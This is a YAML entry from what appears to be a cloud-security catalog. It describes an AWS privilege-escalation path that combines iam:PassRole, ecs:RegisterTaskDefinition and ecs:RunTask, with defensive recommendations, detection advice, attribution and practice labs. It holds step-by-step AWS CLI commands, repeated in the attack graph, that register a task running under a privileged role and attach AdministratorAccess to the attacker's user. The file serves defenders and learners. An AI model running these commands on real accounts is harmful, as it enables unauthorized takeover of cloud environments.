id: ecs-004
name: iam:PassRole + ecs:RegisterTaskDefinition + ecs:RunTask
category: service-passrole
services:
- iam
- ecs
description: A principal with `iam:PassRole`, `ecs:RegisterTaskDefinition`, and `ecs:RunTask` can create a new ECS task definition and attach an existing IAM role to it. When the task is run on Fargate or EC2, the code executes with the permissions of the attached role. The level of access gained depends on the permissions of the available roles.
prerequisites:
  admin:
  - An ECS cluster must exist in the account
  - A role must exist that trusts ecs-tasks.amazonaws.com to assume it
  - The role must have administrative permissions (e.g., AdministratorAccess or an equivalent custom policy)
  lateral:
  - An ECS cluster must exist in the account
  - A role must exist that trusts ecs-tasks.amazonaws.com to assume it
exploitationSteps:
  awscli:
  - step: 1
    command: aws sts get-caller-identity
    description: Get your AWS account ID for use in subsequent commands
  - step: 2
    command: aws ecs list-clusters
    description: Identify available ECS clusters in the account
  - step: 3
    command: |
      aws ec2 describe-vpcs --filters "Name=isDefault,Values=true"
      aws ec2 describe-subnets --filters "Name=vpc-id,Values=VPC_ID"
    description: Get the default VPC and subnet IDs needed for Fargate network configuration
  - step: 4
    command: |
      aws ecs register-task-definition \
        --family privesc-task \
        --network-mode awsvpc \
        --requires-compatibilities FARGATE \
        --cpu 256 \
        --memory 512 \
        --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
        --execution-role-arn "arn:aws:iam::ACCOUNT_ID:role/ecsTaskExecutionRole" \
        --container-definitions '[{
          "name": "exploit-container",
          "image": "public.ecr.aws/amazonlinux/amazonlinux:latest",
          "essential": true,
          "command": ["/bin/sh", "-c", "aws sts get-caller-identity && aws iam attach-user-policy --user-name STARTING_USER --policy-arn arn:aws:iam::aws:policy/AdministratorAccess"]
        }]'
    description: Register a task definition that uses the privileged role and includes a container with commands to escalate privileges
  - step: 5
    command: |
      aws ecs run-task \
        --cluster CLUSTER_NAME \
        --task-definition privesc-task \
        --launch-type FARGATE \
        --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
    description: Run the task on Fargate, which will execute the container with the privileged role's permissions
  - step: 6
    command: aws ecs describe-tasks --cluster CLUSTER_NAME --tasks TASK_ARN
    description: Monitor the task status until it reaches STOPPED state (execution complete)
  - step: 7
    command: aws sts get-caller-identity
    description: Verify that your privileges have been escalated by the task execution
recommendation: |
  High powered service roles + overly permissive `iam:PassRole` is what makes this privilege escalation path exploitable and impactful.

  - **Avoid administrative service roles** - Very rarely does an ECS task need administrative access. Use the principle of least privilege.
  - **Avoid granting `iam:PassRole` on all resources** - Whenever possible, restrict `iam:PassRole` to specific roles or specific services.

  Use IAM policy conditions to restrict which roles can be passed and to which services:

  ```json
  {
    "Effect": "Allow",
    "Action": "iam:PassRole",
    "Resource": "arn:aws:iam::ACCOUNT_ID:role/SpecificECSRole",
    "Condition": {
      "StringEquals": {
        "iam:PassedToService": "ecs-tasks.amazonaws.com"
      }
    }
  }
  ```

  - Monitor CloudTrail for unusual ECS task definition registration followed by immediate task execution
  - Monitor CloudTrail for ECS task execution by principals who do not usually run tasks
  - Monitor CloudTrail for roles being passed to ECS that haven't been used before
  - Monitor and alert on ECS task execution with privileged roles
  - Regularly audit ECS tasks for excessive IAM permissions
  - Regularly audit all IAM roles that trust the ECS service and down-scope any roles with administrative access
limitations: |
  This path provides administrative access only if the passed role has administrative permissions (e.g., AdministratorAccess policy). If only limited roles are available, you gain access limited to those permissions. However, even limited access may enable multi-hop attacks.
discoveredBy:
  name: Nick Spagnola
  organization: Rhino Security Labs
  date: "2020"
discoveryAttribution:
  firstDocumented:
    author: Nick Spagnola
    organization: Rhino Security Labs
    date: 2020
    link: https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/
references:
- title: "Weaponizing AWS ECS Task Definitions to Steal Credentials From Running Containers"
  url: "https://rhinosecuritylabs.com/aws/weaponizing-ecs-task-definitions-steal-credentials-running-containers/"
- title: "Auditing iam:PassRole: A Problematic Privilege Escalation Permission"
  url: "https://www.tenable.com/blog/auditing-iampassrole-a-problematic-privilege-escalation-permission"
- title: "HackTricks - AWS - ECS Privesc"
  url: "https://cloud.hacktricks.wiki/en/pentesting-cloud/aws-security/aws-privilege-escalation/aws-ecs-privesc/index.html#iampassrole-ecsregistertaskdefinition-ecsruntask"

permissions:
  required:
  - permission: iam:PassRole
    resourceConstraints: Target role ARN must be in the Resource section
  - permission: ecs:RegisterTaskDefinition
    resourceConstraints: Must have permission to register new task definitions
  - permission: ecs:RunTask
    resourceConstraints: Must have permission to run tasks in the target cluster
  additional:
  - permission: ecs:ListClusters
    resourceConstraints: Helpful for discovering available ECS clusters
  - permission: ecs:DescribeClusters
    resourceConstraints: Useful for getting cluster details and ARNs
  - permission: ecs:DescribeTasks
    resourceConstraints: Helpful for monitoring task execution status
  - permission: ec2:DescribeVpcs
    resourceConstraints: Needed to find VPCs for Fargate network configuration
  - permission: ec2:DescribeSubnets
    resourceConstraints: Needed to find subnets for Fargate network configuration
  - permission: iam:ListRoles
    resourceConstraints: Helpful for discovering available roles to pass
  - permission: iam:GetRole
    resourceConstraints: Useful for viewing role trust policies and attached permissions
learningEnvironments:
  pathfinder-labs:
    type: open-source
    githubLink: https://github.com/DataDog/pathfinder-labs
    scenario: "privesc-one-hop/to-admin/iam-passrole+ecs-registertaskdefinition+ecs-runtask"
    description: "Deploy Terraform into your own AWS account to practice this attack path"
  cloudgoat:
    type: open-source
    githubLink: https://github.com/RhinoSecurityLabs/cloudgoat
    scenario: "ecs_takeover"
    description: "Deploy vulnerable infrastructure using CloudGoat to practice AWS attacks"
attackVisualization:
  nodes:
  - id: start
    label: Starting Principal
    type: principal
    description: |
      The principal with iam:PassRole, ecs:RegisterTaskDefinition, and ecs:RunTask permissions. Can be an IAM user or role. This path uses an existing ECS cluster.
  - id: task_definition
    label: New ECS Task Definition
    type: resource
    description: |
      The registered ECS task definition with the target role passed via iam:PassRole. Includes a container with commands to execute when launched.
  - id: ecs_task
    label: New Running ECS Task
    type: resource
    description: |
      An ECS task running on Fargate, launched via ecs:RunTask. Unlike CreateService, this executes once without a persistent service.
  - id: target_role
    label: Existing Role That Trusts the ecs-tasks Service
    type: principal
    description: |
      The IAM role passed to the task definition. Must trust ecs-tasks.amazonaws.com. The task automatically assumes this role when it runs.
  - id: admin_outcome
    label: Effective Administrator
    type: outcome
    description: |
      If the target role has administrative permissions, the attacker gains full administrative access via the task's actions.
  - id: partial_outcome
    label: Check for Additional Access
    type: outcome
    color: '#ffeb99'
    description: |
      If the target role has elevated but non-administrative permissions, the attacker gains partial privilege escalation.
  - id: minimal_outcome
    label: No Additional Access
    type: outcome
    color: '#cccccc'
    description: |
      If the target role has minimal permissions, the privilege escalation may not provide meaningful additional access.
  edges:
  - from: start
    to: task_definition
    label: iam:PassRole + ecs:RegisterTaskDefinition
    description: |
      The attacker registers a task definition that passes a privileged role.

      Command:
      ```bash
      aws ecs register-task-definition \
        --family privesc-task \
        --task-role-arn "arn:aws:iam::ACCOUNT_ID:role/PRIVILEGED_ROLE" \
        --network-mode awsvpc \
        --requires-compatibilities FARGATE \
        --cpu 256 --memory 512 \
        --container-definitions '[{"name":"exploit","image":"amazon/aws-cli:latest","command":["iam","attach-user-policy","--user-name","STARTING_USER","--policy-arn","arn:aws:iam::aws:policy/AdministratorAccess"]}]'
      ```
  - from: task_definition
    to: ecs_task
    label: ecs:RunTask
    description: |
      The attacker runs the task on Fargate.

      Command:
      ```bash
      aws ecs run-task \
        --cluster existing-cluster \
        --task-definition privesc-task \
        --launch-type FARGATE \
        --network-configuration "awsvpcConfiguration={subnets=[SUBNET_ID],assignPublicIp=ENABLED}"
      ```
  - from: ecs_task
    to: target_role
    label: Task assumes role and executes
    description: |
      The task automatically assumes the target role and executes the containerized commands with the role's permissions.
  - from: target_role
    to: admin_outcome
    label: If role has admin permissions
    branch: A
    condition: admin
    description: |
      If the target role has AdministratorAccess or equivalent, the task successfully escalates the starting principal to full administrative access.
  - from: target_role
    to: partial_outcome
    label: If role has some permissions
    branch: B
    condition: some_permissions
    description: |
      If the target role has elevated but non-administrative permissions, the task performs limited privilege escalation.
  - from: target_role
    to: minimal_outcome
    label: If role has minimal permissions
    branch: C
    condition: no_permissions
    description: |
      If the target role has minimal permissions, the task may not yield meaningful privilege escalation.
